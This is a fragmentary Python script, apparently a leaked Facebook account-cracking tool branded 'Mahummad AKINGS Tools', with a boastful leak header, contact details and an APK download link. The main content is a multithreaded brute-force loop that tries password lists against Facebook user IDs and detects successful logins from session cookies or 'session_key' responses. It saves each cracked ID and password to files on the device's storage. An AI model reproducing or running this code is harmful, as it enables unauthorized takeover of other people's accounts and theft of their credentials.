#SOURCE LEAKED BY :MR-AYAAN

#REASON : BECAUSE LOL BADSHAH

#WAS INTERFERE BETWEEN

#AKINGS & LKING FIGHT ðŸ˜Ž 
...
logo=("""\033[1;37m
 ...
 Facebook  : Mahummad AKINGS Tricks

 Tool Name : Mahummad AKINGS Tools

 Type type : Free

 Version   : 0.7

 WhatsApp  : +93213915156
...
def clear():
        ...
        os.system('xdg-open https://facebook.com/groups/1107953216541072/')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKINGS_VPN1.0.apk/file');menu()
                        ...
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid Mahummad AKINGS Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                with tred(max_workers=30) as AKINGS:     
                        ...
                        for psx in user:
                                ...
                                AKINGS.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [AKINGS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AKINGS=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in AKINGS:
                                ...
                                print('\r\r\033[1;32m [AKINGS-OK] %s | %s'%(ids,pas))

                                open('/sdcard/AKINGS-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in AKINGS:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [AKINGS-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/AKINGS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AKINGS-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/AKINGS-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [AKINGS-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/AKINGS-OK.txt','a').write(uid+'|'+pas+'\n')
